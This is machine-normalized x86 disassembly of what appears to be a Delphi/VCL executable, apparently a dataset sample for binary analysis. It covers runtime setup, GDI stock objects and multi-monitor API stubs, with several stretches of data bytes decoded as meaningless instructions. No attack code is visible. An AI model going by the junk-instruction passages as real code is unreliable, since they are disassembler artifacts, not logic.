mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42abdc
xor eax eax
push ebp
push sub_42adf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42adfa
mov eax [ ebp - 0x4 ]
call sub_42abe8
retn
mov esp ebp
pop ebp
retn
sub_42ae20
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4235e4
push eax
mov eax ebx
call sub_4235e4
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42abf4
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42ae58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42af21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af28
retn
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
call sub_427f18
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404abc
sub_42af2c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42aa30
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42aaac
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d9c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d9c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d9c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ab78
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a6d4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a6d4
mov [ rw-data ] eax
mov ecx sub_4235f4
mov edx sub_423604
mov eax [ r-xdata ]
call sub_419e30
mov ecx r-xdata
mov edx sub_42380c
mov eax [ r-xdata ]
call sub_419e30
sub_42b038
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b05d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b064
retn
sub_42b074
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_42b1a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b1f8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a6d0
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403234
sub_42b23c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42b280
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_42b2c4
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41a358
mov eax esi
pop esi
pop ebx
retn
sub_42b2f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b315
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b31c
retn
sub_42b3e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b409
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b410
retn
sub_42b41c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_42b4db
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b4e2
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42b41c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404008
sub_42b504
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42b41c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42b58c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42b41c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42b61c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42b41c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42b58c
sub_42b6b2
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42b41c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42b733
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42b41c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b820
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42b41c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b8f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42b41c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b9c8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42b41c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42bb63
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42bb89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bb90
retn
sub_42bba4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bbc9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bbd0
retn
sub_42bcc4
unpckhps xmm1 [ ecx + 0x53 ]
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
lea eax [ eax ]
test [ ebp + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebp + 0xc0042 ] bh
add [ eax ] al
jl r-xdata
add bh bh
dec [ ebp - 0x427bffc0 ]
inc edx
add [ eax ] al
add [ eax ] al
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
xor al 0x40
add [ esp + esi + 0x31cc0040 ] al
inc eax
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov esp 0x66010042
xchg ebx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 4 + 0xc0042 ] al
outsb
je r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ esi ] cl
jns r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add [ ebx + esi * 2 + 0x40 ] bh
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c96f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
push esi
je r-xdata
cld
mov esp 0x66010042
xchg ebx eax
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
mov ebp 0xc0f0042
dec ecx
outsb
je r-xdata
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42bd04c0 ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40405c
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
mov ebp 0xc0042
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
jmp r-xdata
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
insb
je r-xdata
add [ edi ] cl
outsb
je r-xdata
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jo r-xdata
mov esp 0x150f0042
dec ecx
push ebx
add bh bh
inc esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c976
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404abc
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
inc ebx
xor edi edi
int3
mov eax eax
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x44 ] cl
imul ebp [ edi + 0x6e ] 0xe800408d
mov ebp 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_43006a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bh
mov ebp 0xc0042
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2442fe16
xor al [ eax ]
push cs
lodsd [ esi ]
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0xbc487265
inc edx
add [ ecx ] al
xchg bx ax
adc ecx [ ecx + 0x45 ]
insd
jl r-xdata
mov al 0xe
pop edi
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xbc847265
inc edx
add [ ecx ] al
xchg bx ax
add ah cl
xor [ eax ] eax
call 0x2442fdb2
xor al [ eax ]
adc al 0x45
dec eax
insb
jo r-xdata
inc eax
outsb
je r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
add [ edi ] cl
or al 0x49
inc edx
jo r-xdata
outsb
dec eax
insb
lodsd [ esi ]
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42bc88c0 ]
add [ edi ] cl
jae r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42b1dc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405a50
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
outsb
je r-xdata
jo r-xdata
cmp cl [ ecx ]
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
jl r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
dec [ esp + edi * 4 + 0x42 ]
lodsd [ esi ]
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc eax 0x65705349
je r-xdata
outsd
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bbd0
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
lodsd [ esi ]
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
imul esp [ ebp + 0x77 ] 0x117c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
jae r-xdata
dec [ ebx + 0x42bc18c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
sub_42be93
and eax 0x2f0042be
mov esi 0xbe390042
inc edx
add [ 0x150042be ] cl
mov esi 0xbe1d0042
inc edx
add [ ebx - 0x42 ] dh
std
dec esp
int3
cmp dl [ ebx + 0x280042be ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x6d ] dl
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae sub_42be6b
cmp ch [ ebx + 0x2c0042be ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
iretd
inc edx
add [ ebp - 0x42 ] bh
inc edx
add [ edi + 0x430042be ] al
mov esi 0xbe4b0042
inc edx
add [ ebx - 0x42 ] dl
inc edx
add [ ebx - 0x42 ] bl
inc edx
add [ ebx - 0x42 ] ah
inc edx
add [ ebx - 0x42 ] ch
inc edx
add [ edx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sub_42bfa0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42c016
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42c12c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405a50
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c01d
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c0b8
mov [ rw-data ] eax
sub_42c024
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c0b8
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405a7c
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42c07c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405a50
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42c0b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b1a0
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b1a0
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b1a0
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404008
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42c12c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c22d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c07c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42b1f0
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405a38
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d534
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405a38
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d534
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c07c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42b1f0
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c07c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42b1f0
mov ecx r-xdata
call sub_405a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c234
lea eax [ ebp - 0xc ]
call sub_405a38
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
sub edx 0xfffffff8
sub_42c24c
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42b1dc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
